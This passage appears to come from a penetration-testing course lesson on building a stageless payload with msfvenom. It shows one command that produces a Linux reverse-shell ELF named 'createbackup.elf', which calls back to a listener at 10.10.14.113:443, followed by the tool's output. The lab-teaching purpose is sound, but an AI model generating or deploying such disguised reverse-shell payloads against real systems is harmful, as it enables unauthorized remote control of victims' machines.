
## Building A Stageless Payload

Now let's build a simple stageless payload with msfvenom and break down the command.

#### Build It

  Crafting Payloads with MSFvenom

```shell-session
hidalg0dd@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
```

